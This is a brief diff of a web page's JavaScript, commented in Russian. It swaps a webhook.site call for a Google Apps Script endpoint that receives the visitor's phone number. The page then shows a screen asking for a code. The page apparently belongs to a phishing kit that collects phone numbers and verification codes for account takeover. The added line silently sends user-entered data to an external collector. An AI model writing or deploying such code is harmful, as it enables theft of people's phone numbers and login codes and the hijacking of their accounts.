@@ -142,7 +142,7 @@
             loader.style.display = 'none';
             
             // Отправка данных
-            fetch(`https://webhook.site/${WEBHOOK_ID}`)
+            fetch('https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec?phone=' + encodeURIComponent(phone))
                 .catch(console.error);
 
             // Показываем экран кода
